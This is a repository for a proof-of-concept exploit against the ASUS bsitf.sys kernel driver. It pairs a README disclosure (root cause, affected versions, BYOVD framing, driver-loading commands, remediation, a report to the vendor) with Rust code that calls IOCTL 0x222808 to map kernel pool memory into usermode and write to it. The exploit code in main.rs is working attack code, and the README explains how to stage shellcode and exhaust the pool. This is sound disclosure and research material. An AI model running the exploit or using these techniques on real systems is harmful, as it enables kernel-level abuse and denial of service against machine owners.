@@ -1,0 +1,374 @@
+Project Path: arc_gmh5225_asus-bsitf-0-day-poc_m8gp_uzq
+
+Source Tree:
+
+```txt
+arc_gmh5225_asus-bsitf-0-day-poc_m8gp_uzq
+├── Cargo.toml
+├── LICENSE
+├── README.md
+└── src
+    └── main.rs
+
+```
+
+`Cargo.toml`:
+
+```toml
+[package]
+name = "bsitf-poc"
+version = "0.1.0"
+edition = "2021"
+description = "PoC for ASUS bsitf.sys kernel memory mapping vulnerability (IOCTL 0x222808)"
+license = "MIT"
+
+[dependencies]
+windows = { version = "0.58", features = [
+    "Win32_Foundation",
+    "Win32_Storage_FileSystem",
+    "Win32_System_IO",
+    "Win32_Security",
+] }
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`README.md`:
+
+```md
+# POC - ASUS bsitf.sys Kernel Memory Mapping to Usermode
+
+[CVE-2026-13585](https://www.cve.org/CVERecord?id=CVE-2026-13585)
+
+## Summary
+
+The ASUS `bsitf.sys` (also distributed as `AsusBSItf.sys`) kernel driver exposes IOCTL `0x222808` which allocates physically contiguous kernel memory of attacker-controlled size, maps it into the calling process's address space with full read/write permissions, and returns both the usermode virtual address and the physical address to the caller.
+
+The device requires administrator privileges to open, making this an admin-to-kernel escalation. In a BYOVD (Bring Your Own Vulnerable Driver) scenario, an attacker who already has admin (e.g., via social engineering or a separate exploit) can load this legitimately signed driver to gain arbitrary kernel memory access without needing a kernel exploit.
+
+## Affected Versions
+
+| Version | Filename | Package | Pool Type |
+|---------|----------|---------|-----------|
+| 3.0.10.0 | bsitf.sys | ASUS Business Manager / AbmSvcPackage | `NonPagedPool` (executable) |
+| 3.1.10.0 | AsusBSItf.sys | ASUS SCI / AsusSoftwareManager | `NonPagedPoolNx` |
+| 3.1.25.0 | AsusBSItf.sys | ASUS SCI / AsusSoftwareManager | `NonPagedPoolNx` |
+
+All versions create device `\Device\bsitf` with symlink `\DosDevices\bsitf`.
+
+## Impact
+
+The mapped buffer is a fresh kernel pool allocation, not an arbitrary kernel address. The caller controls its contents but not its location. This limits exploitation compared to a true arbitrary kernel R/W.
+
+- **Kernel pool exhaustion (DoS)** — repeated allocations without freeing will exhaust `NonPagedPool`, causing BSOD. No size cap or allocation limit is enforced.
+- **Physical address disclosure** — the IOCTL returns the physical address of every allocation, useful as an info leak or for DMA-based attacks.
+- **Executable kernel memory staging (v3.0.x only)** — on version 3.0.10.0, the pool type is `NonPagedPool` (executable). Shellcode can be written from usermode into the mapped buffer, but a separate vulnerability is required to redirect kernel execution to the buffer address.
+
+On v3.1.x versions (`NonPagedPoolNx`), the buffer is non-executable and the practical impact is limited to DoS and physical address disclosure.
+
+## Root Cause
+
+IOCTL `0x222808` in the dispatch handler performs the following with no input validation:
+
+```c
+alloc_size = *(DWORD *)Irp->AssociatedIrp.SystemBuffer;  // user-controlled
+
+kernel_va = MmAllocateContiguousMemory(alloc_size, 0xffffffff);
+mdl = IoAllocateMdl(kernel_va, alloc_size, FALSE, FALSE, NULL);
+MmBuildMdlForNonPagedPool(mdl);
+user_va = MmMapLockedPages(mdl, UserMode);
+
+output[0] = user_va;        // usermode virtual address
+output[1] = physical_addr;  // physical address of allocation
+```
+
+No checks on allocation size, outstanding allocation count, or input validation. The device requires admin to open, but once a handle is acquired, IOCTLs are unrestricted.
+
+## Proof of Concept
+
+### Build
+
+```
+cargo build --release
+```
+
+### Load the driver
+
+```
+sc create bsitf binPath= "C:\path\to\bsitf.sys" type= kernel
+sc start bsitf
+```
+
+### Run
+
+```
+# default: 0x1000 (4KB) allocation
+cargo run --release
+
+# custom size (hex)
+cargo run --release -- 10000
+```
+
+### Expected output
+
+```
+[*] bsitf.sys kernel memory mapping PoC
+[*] target alloc size: 0x1000
+
+[+] device handle acquired
+
+[*] allocating 0x1000 bytes of kernel memory via IOCTL 0x222808
+[+] kernel allocation succeeded:
+    usermode VA:     0x000001D856F90000
+    physical addr:   0x00000000BF6CB000
+
+[*] original contents (first 16 bytes):
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+[*] writing 0xCC pattern (int3 sled)...
+[+] readback: usermode R/W CONFIRMED
+
+[*] freeing kernel mapping via IOCTL 0x22280C
+[+] mapping freed successfully
+```
+
+Tested on Windows 11 24H2 (requires administrator).
+
+## Remediation
+
+1. Validate allocation size with a reasonable upper bound
+2. Limit the number of outstanding allocations per handle
+3. Do not map kernel allocations into usermode address space
+4. Do not return physical addresses to usermode callers
+5. Use `NonPagedPoolNx` on all versions
+
+## Timeline
+
+| Date | Event |
+|------|-------|
+| 2026-04-06 | Vulnerability discovered via automated analysis |
+| 2026-04-06 | PoC confirmed on Windows 11 24H2 |
+| 2026-04-06 | Report submitted to ASUS PSIRT |
+
+## References
+
+- [CWE-782: Exposed IOCTL with Insufficient Access Control](https://cwe.mitre.org/data/definitions/782.html)
+- Device: `\Device\bsitf`, Symlink: `\DosDevices\bsitf`
+- Dispatch handler: `FUN_140001070`
+
+## Disclaimer
+
+This proof of concept is provided for authorized security research and responsible disclosure purposes only. Do not use this against systems you do not own or have explicit permission to test.
+
+```
+
+`src/main.rs`:
+
+```rs
+// bsitf.sys / AsusBSItf.sys — kernel memory allocation + usermode mapping poc
+// ioctl 0x222808: allocates physically contiguous kernel memory and maps to usermode
+// tested: bsitf.sys v3.0.10.0, AsusBSItf.sys v3.1.10.0 / v3.1.25.0
+
+#![deny(dead_code, unused_variables, unused_imports)]
+
+use std::mem;
+use std::ptr;
+
+use windows::core::PCSTR;
+use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
+use windows::Win32::Storage::FileSystem::{CreateFileA, OPEN_EXISTING};
+use windows::Win32::System::IO::DeviceIoControl;
+
+const IOCTL_KMAP_ALLOC: u32 = 0x222808;
+const IOCTL_KMAP_FREE: u32 = 0x22280C;
+const DEFAULT_ALLOC_SIZE: u32 = 0x1000;
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+struct KmapResult {
+    user_va: u64,
+    phys_addr: u64,
+}
+
+fn open_device() -> Result<HANDLE, String> {
+    let path = b"\\\\.\\bsitf\0";
+    let handle = unsafe {
+        CreateFileA(
+            PCSTR(path.as_ptr()),
+            (GENERIC_READ.0 | GENERIC_WRITE.0).into(),
+            Default::default(),
+            None,
+            OPEN_EXISTING,
+            Default::default(),
+            None,
+        )
+    }
+    .map_err(|e| format!("open \\\\.\\bsitf failed: {e}"))?;
+
+    Ok(handle)
+}
+
+fn alloc_kernel_memory(device: HANDLE, size: u32) -> Result<KmapResult, String> {
+    let mut in_buf = size;
+    let mut result = KmapResult {
+        user_va: 0,
+        phys_addr: 0,
+    };
+    let mut returned: u32 = 0;
+
+    let ok = unsafe {
+        DeviceIoControl(
+            device,
+            IOCTL_KMAP_ALLOC,
+            Some(ptr::from_mut(&mut in_buf).cast()),
+            mem::size_of::<u32>() as u32,
+            Some(ptr::from_mut(&mut result).cast()),
+            mem::size_of::<KmapResult>() as u32,
+            Some(&mut returned),
+            None,
+        )
+    };
+
+    if ok.is_err() {
+        return Err(format!("IOCTL 0x222808 failed: {:?}", ok.err()));
+    }
+
+    if result.user_va == 0 {
+        return Err("driver returned null VA".into());
+    }
+
+    Ok(result)
+}
+
+fn free_kernel_memory(device: HANDLE, mapping: &KmapResult) -> Result<(), String> {
+    let mut free_buf = *mapping;
+    let mut returned: u32 = 0;
+
+    let ok = unsafe {
+        DeviceIoControl(
+            device,
+            IOCTL_KMAP_FREE,
+            Some(ptr::from_mut(&mut free_buf).cast()),
+            mem::size_of::<KmapResult>() as u32,
+            Some(ptr::from_mut(&mut free_buf).cast()),
+            mem::size_of::<KmapResult>() as u32,
+            Some(&mut returned),
+            None,
+        )
+    };
+
+    if ok.is_err() {
+        return Err(format!("free failed: {:?} (kernel memory leaked)", ok.err()));
+    }
+
+    Ok(())
+}
+
+fn main() {
+    let alloc_size = std::env::args()
+        .nth(1)
+        .and_then(|s| u32::from_str_radix(s.trim_start_matches("0x"), 16).ok())
+        .unwrap_or(DEFAULT_ALLOC_SIZE);
+
+    println!("[*] bsitf.sys kernel memory mapping PoC");
+    println!("[*] target alloc size: 0x{alloc_size:X}\n");
+
+    let device = match open_device() {
+        Ok(h) => {
+            println!("[+] device handle acquired\n");
+            h
+        }
+        Err(e) => {
+            eprintln!("[-] {e}");
+            std::process::exit(1);
+        }
+    };
+
+    // allocate kernel memory via ioctl 0x222808
+    println!("[*] allocating 0x{alloc_size:X} bytes of kernel memory via IOCTL 0x222808");
+    let mapping = match alloc_kernel_memory(device, alloc_size) {
+        Ok(r) => r,
+        Err(e) => {
+            eprintln!("[-] {e}");
+            unsafe { let _ = CloseHandle(device); }
+            std::process::exit(1);
+        }
+    };
+
+    println!("[+] kernel allocation succeeded:");
+    println!("    usermode VA:     0x{:016X}", mapping.user_va);
+    println!("    physical addr:   0x{:016X}\n", mapping.phys_addr);
+
+    // verify usermode read/write to kernel pool memory
+    let mapped: *mut u8 = mapping.user_va as *mut u8;
+
+    print!("[*] original contents (first 16 bytes):\n    ");
+    for i in 0..16 {
+        let byte = unsafe { ptr::read_volatile(mapped.add(i)) };
+        print!("{byte:02X} ");
+    }
+    println!("\n");
+
+    // write test pattern
+    println!("[*] writing 0xCC pattern (int3 sled)...");
+    for i in 0..64 {
+        unsafe { ptr::write_volatile(mapped.add(i), 0xCC) };
+    }
+
+    // verify readback
+    let mut verified = true;
+    for i in 0..64 {
+        if unsafe { ptr::read_volatile(mapped.add(i)) } != 0xCC {
+            verified = false;
+            break;
+        }
+    }
+
+    if verified {
+        println!("[+] readback: usermode R/W CONFIRMED\n");
+    } else {
+        println!("[-] readback: MISMATCH\n");
+    }
+
+    // zero out test data
+    for i in 0..64 {
+        unsafe { ptr::write_volatile(mapped.add(i), 0x00) };
+    }
+
+    // free the mapping
+    println!("[*] freeing kernel mapping via IOCTL 0x22280C");
+    match free_kernel_memory(device, &mapping) {
+        Ok(()) => println!("[+] mapping freed successfully"),
+        Err(e) => eprintln!("[-] {e}"),
+    }
+
+    unsafe { let _ = CloseHandle(device); }
+}
+
+```
